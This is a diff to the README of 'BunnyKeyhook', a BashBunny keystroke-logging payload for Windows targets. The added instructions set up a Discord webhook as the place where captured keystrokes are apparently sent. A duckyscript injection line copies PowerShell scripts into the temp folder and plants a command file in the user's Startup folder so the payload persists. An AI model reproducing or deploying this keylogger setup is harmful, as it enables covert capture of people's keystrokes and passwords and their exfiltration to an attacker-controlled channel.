@@ -28,9 +28,26 @@ BunnyKeyhook is a BashBunny payload that uses PowerShell to log keystrokes. It w
 - Windows Target
 
 ## Instructions:
-Set-Up/Installation
-1. in line 17 of *duckyscript.txt*, change change `'BashBunny'` to the name of your Bash Bunny
-2. in line 17 *duckyscript.txt*, change `switch1` to switch position that stores the paylaod
+**Create Discord Webhook**
+1. create a discord server by clicking the plus button in the bottom left
+
+![Create Server](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/create-server.png)
+
+2. go into the `integrations` section in the server's settings
+3. click `Webhooks`
+![Integrations](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/integrations.png)
+
+4. create a new webhook by clicking `New Webhook`
+5. click `Copy Webhook URL` to copy the webhook URL
+![Webhook](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/webhook.png)
+
+**Set-Up/Installation**
+1. in line 5 of *p.ps1*, replace `DISCORDWEBHOOK` with the webhook URL 
+```powershell
+$webhook = "DISCORDWEBHOOK"
+```
+2. in line 17 of *duckyscript.txt*, change `'BashBunny'` to the name of your Bash Bunny
+3. in line 17 *duckyscript.txt*, change `switch1` to switch position that stores the paylaod
     - make sure to replace *all* appearances of `switch1` if you decide to change 
 ```powershell
 STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
